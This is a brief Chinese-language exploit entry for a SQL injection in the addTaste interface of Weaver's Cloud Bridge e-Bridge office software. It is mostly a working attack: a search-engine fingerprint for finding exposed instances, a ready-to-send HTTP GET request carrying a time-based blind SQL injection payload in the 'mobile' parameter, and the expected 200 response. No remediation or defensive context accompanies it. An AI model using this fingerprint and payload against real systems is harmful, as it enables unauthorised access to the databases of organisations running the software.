# 泛微云桥e-BridgeaddTaste接口SQL注入漏洞

泛微OA ｜ SQL注入 ｜ —
- **指纹**：`app="泛微-云桥e-Bridge"`

**Payload**
```
GET/taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP(5-(IF(18015%3e3469,0,4)))))mKjk)%20OR%20%27KQZm%27=%27REcX HTTP/1.1
SL-CE-SUID: 25
```
- **响应特征**：200